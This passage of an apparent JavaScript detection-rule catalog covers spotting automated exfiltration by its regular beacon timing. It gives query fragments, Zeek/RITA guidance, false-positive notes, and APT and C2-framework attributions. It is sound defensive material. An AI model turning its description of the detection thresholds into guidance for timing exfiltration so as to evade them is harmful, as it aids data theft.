   [ip.src, ip.dst] < 5s
&& flow-count groupby [ip.src, ip.dst]
   > 20 within 3600s`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
[Beacon timing analysis - typically requires Zeek + RITA, or commercial NDR with beacon detection]`,
        suricata: `[Beacon/automation timing detection
requires statistical analysis of
flow inter-arrival times - this is
the canonical use case for Zeek +
RITA (Real Intelligence Threat
Analytics). Suricata signatures
don't measure flow timing
distributions; that's the job of
flow-aware analytics layer.]
Use Zeek + RITA or commercial NDR`,
        notes: "Automated exfil produces highly-regular timing fingerprints: flow every 60 seconds with <5s standard deviation, flow every 5 minutes precisely, flow at exact :00 of each hour. Human users don't produce this regularity - they have variable behavior. Tools: RITA (Real Intelligence Threat Analytics) is the canonical open-source beacon detection tool, working from Zeek conn.log. Commercial NDR platforms (Corelight, ExtraHop, Vectra) include beacon detection by default. Pattern: 20+ flows from one source to one destination within an hour, with very low standard deviation in inter-arrival times. Often detected as part of C2 beacon detection (TA0011) but also applies to scheduled exfil - automated exfil tools often run on cron-like timers that produce this signature. False positives: legitimate scheduled tasks (Windows Update checks, NTP syncing, monitoring agents calling home) - build per-application baselines. After exclusions, the signature is high-confidence. Particularly important to detect because automation-driven exfil can persist for weeks before discovery if no detection layer monitors timing patterns.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Beacon-style timing in long-term espionage operations including SolarWinds." },
          { cls: "apt-cn", name: "APT41", note: "Automated exfil patterns in sustained operations." },
          { cls: "apt-mul", name: "Beacon-Based C2", note: "Cobalt Strike, Sliver, Mythic all support scheduled exfil tasks." },
          { cls: "apt-mul", name: "Multi", note: "Documented in modern operations using C2 frameworks with built-in scheduled exfil." }
        ],
        cite: "MITRE ATT&CK T1020"
      }
    ]
  }
];
